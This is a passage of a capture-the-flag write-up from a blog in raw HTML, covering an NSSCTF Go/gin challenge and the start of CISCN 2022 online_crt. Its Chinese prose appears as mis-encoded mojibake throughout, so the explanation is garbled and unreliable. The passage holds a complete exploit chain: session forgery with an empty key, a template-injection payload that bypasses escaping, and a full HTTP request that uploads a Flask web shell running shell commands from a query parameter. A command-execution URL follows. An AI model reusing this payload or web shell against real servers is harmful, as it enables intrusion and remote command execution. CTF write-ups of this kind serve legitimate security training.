class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>main<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å…ˆçœ‹mianæ–‡ä»¶ä¼šå‘ç°å…¶å‡ ä¸ªè·¯ç”±ã€‚æˆ‘ä»¬æŸ¥çœ‹routeçš„æºç <br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªè·¯ç”±ä¸»è¦æ˜¯è®¾ç½®sessionï¼Œå¦‚æœnameä¸ºç©ºè®¾ç½®ä¸ºguestã€‚æˆ‘ç¬¬ä¸€è¨€å°±æ„Ÿè§‰æ˜¯sessionä¼ªé€ ï¼Œéƒ½æ€è€ƒèµ·æœ‰ä»€ä¹ˆæ¼æ´å¯ä»¥ä»ç¯å¢ƒå˜é‡ä¸­å¾—åˆ°SESSION_KEYäº†ï¼Œç»“æœçœ‹ä¸€ä¸‹wpå‘ç°keyæ˜¯ç©ºçš„ã€‚æ„Ÿè§‰è¿™ä¸ªåœ°æ–¹å‡ºçš„æœ‰ç‚¹ä¸å¥½ï¼Œæˆ‘ä»¬å°†æºç ä¸­çš„guestæ”¹æˆadminå†åœ¨æœ¬åœ°è¿è¡Œï¼Œç”±äºkeyæ˜¯ç©ºæ‰€æœ‰åœ¨æœ¬åœ°å¾—åˆ°çš„adminçš„sessionå’Œé¢˜ç›®adminçš„sessionä¸€æ ·ã€‚å¾—åˆ°adminçš„sessionæˆ‘ä»¬å°±å¯ä»¥è®¿é—®/adminè·¯ç”±äº†æˆ‘ä»¬çœ‹ä¸€ä¸‹å…¶ä»–è·¯ç”±çš„ä»£ç </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹adminå‡½æ•°ä¼šå‘ç°<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶ç›´æ¥å°†pongo2.FromStringè§£æå‡ºçš„å¯¹è±¡cè¾“å‡ºåˆ°äº†æ¨¡æ¿ä¸­é‚£ä¹ˆå°±å­˜åœ¨sstiæ³¨å…¥<br>æˆ‘ä»¬å†çœ‹ä¸€ä¸‹flaskè·¯ç”±<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹å‡ºæ¥å­˜åœ¨ssrfä¼šå°†ä¼ å€¼çš„nameå’Œ<code>http://127.0.0.1:5000/</code>æ‹¼æ¥è®¿é—®å†…ç½‘èµ„äº§ã€‚æˆ‘ä»¬å…ˆæŸ¥çœ‹flaskè·¯ç”±æŒ‡å‘çš„å†…ç½‘ç½‘ç«™æ˜¯ä»€ä¹ˆ<br><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶è¿”å›äº†127.0.0.1:5000çš„æºç æˆ‘ä»¬ä½¿ç”¨htmlæ–‡ä»¶æ¥æŸ¥çœ‹<br></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ä¼šå‘ç°æŠ¥é”™ä½¿å¾—ç¨‹åºçš„æºç å’Œè·¯å¾„æ³„éœ²äº†ã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å¼€å¯äº†debugï¼Œå³æˆ‘ä»¬ä¿®æ”¹äº†æºç ç½‘é¡µä¹Ÿä¼šå¿«é€Ÿæ›´æ–°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨adminç•Œé¢çš„sstiæ¥æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ å‡½æ•°ï¼Œæ¥ä¸Šä¼ ä¸€ä¸ªshellè¦†ç›–è¿™ä¸ªæ–‡ä»¶ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>æˆ‘ä»¬ä¼šå‘ç°å¯¼å…¥äº†ginåŒ…é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ginåŒ…çš„å‡½æ•°ã€‚</p><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c.SaveUploadedFile(file *multipart.FileHeader, dst <span class="type">string</span>)</span><br><span class="line"><span class="comment">//fileï¼šmultipart.FileHeader ç±»å‹çš„æŒ‡é’ˆï¼Œä»£è¡¨ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å¤´ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ c.FormFile(&quot;file&quot;) è·å–ã€‚[è¿™ä¸ªfileå…¶å®å°±æ˜¯formè¡¨å•ä¸­çš„nameå±æ€§çš„å€¼]</span></span><br><span class="line"><span class="comment">//dstï¼šå­—ç¬¦ä¸²ç±»å‹ï¼Œä»£è¡¨æ–‡ä»¶ä¿å­˜çš„ç›®æ ‡è·¯å¾„ã€‚</span></span><br><span class="line">c.Request<span class="comment">//è·å–httpçš„ä¿¡æ¯å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ ¼å¼æ¥è·å–è¯·æ±‚å¤´çš„å†…å®¹</span></span><br><span class="line">c.Request.Referer<span class="comment">//åƒè¿™æ ·å°±å¯ä»¥å¾—åˆ°Refererçš„å†…å®¹</span></span><br></pre></td></tr></table></figure><p>æ­£å¸¸æˆ‘ä»¬æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ çš„sstiçš„payloadåº”è¯¥æ˜¯ä¸‹é¢è¿™ä¸ª<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.SaveUploadedFile(c.FormFile(<span class="string">&#x27;file&#x27;</span>),<span class="string">&quot;/app/server.py&quot;</span>)</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯ç”±äºæ”¹é¢˜ç›®æœ‰å¦‚ä¸‹çš„è¿‡æ»¤å¯¼è‡´å…¶ç‰¹æ®Šå­—ç¬¦è¢«ç¼–ç ä½¿å¾—æ— æ³•è¿›è¡Œssti<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.EscapeString(name)</span><br></pre></td></tr></table></figure><br>è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨c.Requestæ¥ä»£æ›¿éœ€è¦ç”¨åˆ°ç‰¹æ®Šç¬¦å·çš„å­—ç¬¦,ä»¥æ­¤æ¥ç»•è¿‡waf<br>é‚£ä¹ˆpayloadå°±å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.Referer())&#125;&#125;</span><br></pre></td></tr></table></figure><br>æ¥ä¸‹æ¥å°±åªè¦æ„å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„formè¡¨å•è¿›è¡Œæ–‡ä»¶ä¸Šä¼ å³å¯<br>exp<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.Referer())&#125;&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node5.anna.nssctf.cn:28535</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>/app/server.py</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>522</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryuMHzDNELmEQClC8i</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>file</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session-name=MTcxMzMyMjg4M3xEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXy1hS6mhHShqW9AhRhAbwm8TPUeR5aus6EAENV_jfwn1w==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryuMHzDNELmEQClC8i</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;py.py&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/x-python</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">app = Flask(__name__)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@app.route(<span class="string">&#x27;/&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql">def <span class="keyword">index</span>():</span></span><br><span class="line"><span class="language-pgsql">    <span class="type">name</span> = request.args[<span class="string">&#x27;name&#x27;</span>]</span></span><br><span class="line"><span class="language-pgsql">    <span class="keyword">return</span> os.popen(<span class="type">name</span>).<span class="keyword">read</span>()</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">if</span> __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="language-pgsql">    app.run(host=&quot;0.0.0.0&quot;, port=<span class="number">5000</span>, <span class="keyword">debug</span>=<span class="keyword">True</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryuMHzDNELmEQClC8i</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">é»æ„ªæ°¦</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryuMHzDNELmEQClC8i--</span></span></span><br></pre></td></tr></table></figure><br>å°†UAå¤´å’ŒRefererçš„å†…å®¹åˆ†åˆ«è¿›è¡Œæ›¿æ¢å³å¯æˆåŠŸä¸Šä¼ æ–‡ä»¶å†…å®¹<br>ä¹‹åå°±å‘½ä»¤æ‰§è¡Œäº†,ç¯å¢ƒå˜é‡é‡Œå­˜åœ¨flag<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:28956/flask?name=%3fname=env</span><br></pre></td></tr></table></figure></p><h1 id="CISCN-2022-åˆèµ›-online-crt"><a href="#CISCN-2022-åˆèµ›-online-crt" class="headerlink" title="[CISCN 2022 åˆèµ›]online_crt"></a>[CISCN 2022 åˆèµ›]online_crt</h1><p>è¿™é“é¢˜ç›®æˆ‘ä»¬æ‰“å¼€æ˜¯ä¸€ä¸ªè¯ä¹¦æ‰“å°çš„ç½‘ç«™.æˆ‘ä»¬å…ˆæŸ¥çœ‹æºç <br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å…ˆæŸ¥çœ‹å™¨å®šä¹‰çš„å‡ ä¸ªè·¯ç”±.<br>/getcrtè¿™ä¸ªè·¯ç”±æ˜¯ç”¨äºåˆ›å»ºä¸€ä¸ªè¯ä¹¦çš„è·¯ç”±<br>/createlink è¿™ä¸ªè·¯ç”±è¿ç”¨äº†c_rehashå‘½ä»¤<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªpopenå‡½æ•°ç»™äººä¸€ç§å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„æ ·å­.ä½†æ˜¯æ²¡æœ‰å‚æ•°çš„å…¥å£å”¯ä¸€å¯çœ‹çš„å°±æ˜¯è¯ä¹¦çš„åå­—.æˆ‘ä»¬æŸ¥ä¸€ä¸‹c_rehashä¼šå‘ç°å…¶å­˜åœ¨æ¼æ´<br><a 